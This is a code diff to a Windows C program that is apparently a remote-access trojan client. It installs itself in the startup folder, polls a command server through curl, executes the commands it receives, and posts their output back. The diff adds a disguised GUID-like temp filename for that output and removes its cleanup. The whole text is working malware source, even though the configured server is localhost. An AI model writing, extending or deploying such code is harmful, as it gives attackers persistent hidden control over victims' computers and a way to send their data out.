@@ -4,6 +4,7 @@
 #include <windows.h>
 #define MAX_SIZE 32768                                      // 32kb
 #define SERVER "127.0.0.1:5001"
+#define FTNAME "3c3662b-cb66-1d6d-e679-c636744c66b62.tmp"
 
 int move_to_startup();
 char *get_exe_name();
@@ -12,7 +13,8 @@ char *get_cmd(const char *cmd);
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
     move_to_startup(get_exe_name());
     chdir(getenv("USERPROFILE"));
-    char curl[128];
+    char curl[128], fpath[MAX_PATH];
+    sprintf(fpath, "%s\\%s", getenv("TEMP"), FTNAME);
     while(1){
         Sleep(500);                                         // 0.5s delay
         sprintf(curl, "curl -k -s %s/command", SERVER);
@@ -27,12 +29,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             command = strdup("echo.");
         }
         char *result = get_cmd(command);
-        FILE *fp = fopen("tmp.txt", "wb");                  // ensure non-ascii characters
+        FILE *fp = fopen(fpath, "wb");                      // write binary to ensure non-ascii characters
         size_t txt = fwrite(result, sizeof(char), strlen(result), fp);
         fclose(fp);
-        sprintf(curl, "curl -k -s -X POST %s/result --data-binary @tmp.txt", SERVER);
+        sprintf(curl, "curl -k -s -X POST %s/result --data-binary @%s", SERVER, fpath);
         get_cmd(curl);
-        remove("tmp.txt");
     }
 }
 
